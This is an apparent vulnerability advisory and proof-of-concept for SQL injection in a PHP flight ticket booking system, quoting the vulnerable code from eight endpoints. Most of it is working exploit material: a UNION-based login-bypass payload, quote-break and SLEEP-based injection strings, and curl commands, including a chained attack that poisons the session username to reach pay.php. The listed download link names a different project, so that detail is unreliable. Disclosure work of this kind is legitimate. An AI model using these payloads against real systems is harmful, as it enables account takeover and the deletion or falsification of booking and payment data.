# simple-flight-booking-SQL
Proof-of-Concept and Advisory for Simple Flight Booking System SQLi

The download URL for the project is at:
[https://code-projects.org/employee-profile-management-system-in-php-with-source-code/]

---

# Vulnerability Advisory & Exploit

## Affected Version

Simple Flight Ticket Booking System 

---

## Vulnerability Type

SQL Injection — Multiple Endpoints (username, flightno, bookid, session user, etc.)

- login.php (parameter: username)

- register.php (parameters: username, firstname, lastname, email, pwd1, etc.)

- Adminadd.php (parameters: flightno, airplaneid, departure, dtime, arrival, atime, ec, ep, bc, bp)

- Adminupdate.php (parameter: flightno and related GET fields)

- Admindelete.php (parameter: flightno)

- Adminsearch.php (parameter: flightno)

- cartdelete.php (parameter: bookid)

- pay.php (parameter: $_SESSION['user'] → derived from username)

---

## Technical Summary (evidence in code)

1) Authentication-related SQLi (login bypass / account takeover pattern)
flight booking/login.php:

        $username=$_POST['username'];
        $res=mysqli_query($conn,"SELECT * FROM passanger WHERE username='$username'");
        ...
        if($row['password']==$pwd) { ... }

User input is injected directly into a SELECT without parameterization.

2) Registration SQLi (unsafe INSERT, attacker-controlled stored fields)
flight booking/register.php builds an INSERT ... VALUES('$username', '$email', '$pwd1', ...) directly from $_POST[...] (no prepared statements).

3) Admin flight management SQLi (unsafe GET + missing access control in these scripts)
flight booking/Adminadd.php, Adminupdate.php, Admindelete.php, Adminsearch.php all use $_GET[...] directly inside INSERT/UPDATE/DELETE/SELECT.

Example (flight booking/Admindelete.php):

        $flightno = $_GET['flightno'];
        $sql = "DELETE FROM flight WHERE number = '$flightno'";

4) Cart deletion SQLi
flight booking/cartdelete.php:
  
        $bookid = $_POST["bookid"];
        $delete = "DELETE FROM book WHERE ID = '$bookid'";
        if(mysqli_query($con,$delete)) { header("Location: cartshow.php"); } else { echo "Error"; }

5) Payment update uses session-derived value unsafely (secondary impact)
flight booking/pay.php:

        $user = $_SESSION['user'];
        mysqli_query($con,"UPDATE book SET paid = '1' WHERE username = '$user'");

If an attacker can poison username (e.g., via registration) this becomes a data integrity risk.

---

## Proof-of-Concept (Exploit)

1) login.php — SQLi in username (auth bypass)

**Vulnerable code**: SELECT * FROM passanger WHERE username='$username'

**POC** (UNION-based login bypass)

Send username as a UNION that returns a row whose password equals your submitted pwd.

**Exploit payload**

username: 

    ' UNION SELECT 'attacker','a','pwn','a','a','a','a','a','2020-01-01' -- -
    
pwd: pwn

**Exploit steps**

- Intercept login POST to login.php.

- Replace fields with the payload above.

- If successful, server redirects to homepage.html (session set).

**Example curl**

    curl -i -X POST \
      -d "username=' UNION SELECT 'attacker','a','pwn','a','a','a','a','a','2020-01-01' -- -&pwd=pwn" \
      "http://127.0.0.1/flight%20booking/login.php"
2) register.php — SQLi in registration fields (error-based proof)

**Vulnerable code**: INSERT INTO passanger(...) VALUES('$username', ... '$pwd1', ...)

**POC** (syntax-break to force SQL error path)
Make the INSERT invalid by injecting an unmatched quote into username. The page triggers: alert('error while registering you...');

**Exploit payload**
username: 
      ' Fill other required fields with any values.

**Exploit steps**

- Intercept registration POST to register.php.

- Set username to '.

- Submit and observe the error alert.

**Example curl**
  
      curl -i -X POST \
        -d "username='&firstname=a&lastname=a&tel=1&email=a@a.com&pwd1=a" \
        "http://127.0.0.1/flight%20booking/register.php"
        
3) Adminadd.php — SQLi in flightno (error-based proof)

**Vulnerable code**: INSERT INTO flight VALUES('$flightno', ...) and INSERT INTO class VALUES('$flightno', ...)
**Visible proof**: prints Errormessage: ... on failure.

**POC** (syntax-break to trigger mysqli_error output)
flightno: 
          '

**Exploit steps**

- Request Adminadd.php with flightno=' and any placeholders for the other GET params.

- Observe Errormessage: ... in the response.

**Example curl**
    
        curl -i \
        "http://127.0.0.1/flight%20booking/Adminadd.php?flightno='%27&airplaneid=1&departure=A&dtime=1&arrival=B&atime=1&ec=1&ep=1&bc=1&bp=1"
        
4) Adminupdate.php — SQLi in flightno (error-based proof)

**Vulnerable code**: UPDATE flight ... WHERE number = '$flightno' (+ class updates)

**Visible proof**: prints Errormessage: ... on failure.

**POC** (syntax-break)

flightno: 
        '

Exploit steps

- Request Adminupdate.php with flightno=' and dummy values for other params.

- Observe Errormessage: ... in the response.

**Example curl**

        curl -i \
        "http://127.0.0.1/flight%20booking/Adminupdate.php?flightno='%27&airplaneid=1&departure=A&dtime=1&arrival=B&atime=1&ec=1&ep=1&bc=1&bp=1"
        
5) Admindelete.php — SQLi in flightno (error-based proof)

**Vulnerable code**: DELETE FROM flight WHERE number = '$flightno'

**Visible proof**: prints Errormessage: ... on failure.

**POC** (syntax-break)

flightno: 
      '

Exploit steps

- Request Admindelete.php?flightno='

- Observe Errormessage: ... in the response (proves injectable construction).

**Example curl**

        curl -i \
        "http://127.0.0.1/flight%20booking/Admindelete.php?flightno='%27"
        
6) Adminsearch.php — SQLi in flightno (time-based, non-destructive proof)

**Vulnerable code**:

SELECT * FROM flight WHERE flight.number = '$flightno'

SELECT * FROM class WHERE number = '$flightno'

**POC** (time-based delay)

flightno:

      ' OR SLEEP(3) -- -

**Exploit steps**

- Request Adminsearch with the payload.

- Confirm response time increases by ~3 seconds.

**Example curl**
      
      time curl -i \
      "http://127.0.0.1/flight%20booking/Adminsearch.php?flightno='%20OR%20SLEEP(3)%20--%20-"
      
7) cartdelete.php — SQLi in bookid (error-based proof)

**Vulnerable code**: DELETE FROM book WHERE ID = '$bookid'

**Visible proof**: returns plain text Error on SQL failure (instead of redirect).

**POC** (syntax-break)

bookid: 
      '

**Exploit steps**

- Log in (needed because it checks $_SESSION['user']).

- Intercept POST to cartdelete.php.

- Set bookid to ' and send.

- If you see Error instead of being redirected to cartshow.php, SQLi is confirmed.

**Example curl** (replace cookie)

      curl -i -X POST \
        -H "Cookie: PHPSESSID=YOUR_SESSION_ID" \
        -d "bookid='" \
        "http://127.0.0.1/flight%20booking/cartdelete.php"
        
8) pay.php — SQLi via $_SESSION['user'] (time-based proof; requires crafting session user)

**Vulnerable code**: UPDATE book SET paid='1' WHERE username = '$user'
No error is printed, so we prove it via timing delay.

**POC idea**

Use the login.php UNION bypass to set the session username to a value containing an injected condition with SLEEP(3).

Visit pay.php and measure the delay.

*Step A — Login with a crafted session username*
Send this to login.php:

username:

      ' UNION SELECT 'x'' OR SLEEP(3) -- -','a','pwn','a','a','a','a','a','2020-01-01' -- -

pwd: pwn

**Explanation**: the first selected column becomes the “username” stored into $_SESSION['user'] as:
x' OR SLEEP(3) -- -

**Example curl**
      
      curl -i -c cookies.txt -X POST \
        -d "username=' UNION SELECT 'x'' OR SLEEP(3) -- -','a','pwn','a','a','a','a','a','2020-01-01' -- -&pwd=pwn" \
        "http://127.0.0.1/flight%20booking/login.php"

*Step B — Visit pay.php and observe delay*

      time curl -i -b cookies.txt \
        "http://127.0.0.1/flight%20booking/pay.php"

If the page load is delayed by ~3 seconds, the injected session value is being concatenated into the UPDATE query (SQLi confirmed).
